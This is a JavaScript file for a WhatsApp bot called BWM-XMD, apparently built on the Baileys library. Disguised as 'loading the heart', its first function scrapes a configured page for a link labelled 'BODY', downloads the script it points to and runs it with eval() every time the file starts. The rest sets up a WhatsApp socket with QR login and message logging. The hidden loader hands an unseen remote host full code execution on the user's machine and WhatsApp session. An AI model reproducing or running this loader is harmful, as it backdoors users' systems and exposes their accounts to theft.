
//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Ibrahim Adams                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require("./config");

async function fetchBODYUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("BODY")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('heart not found 😭');
    }

    console.log('The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchBODYUrl();
const { default: makeWASocket } = require('@whiskeysockets/baileys');

async function startBot() {
  const sock = makeWASocket({
    printQRInTerminal: true,
    logger: console, // Enable detailed logs
  });

  sock.ev.on('connection.update', (update) => {
    console.log('Connection Update:', update);
    if (update.qr) console.log('New QR Code Generated!');
    if (update.connection === 'open') console.log('Bot is connected!');
  });

  sock.ev.on('messages.upsert', (m) => {
    console.log('Received message:', m);
  });
}

startBot().catch(console.error);
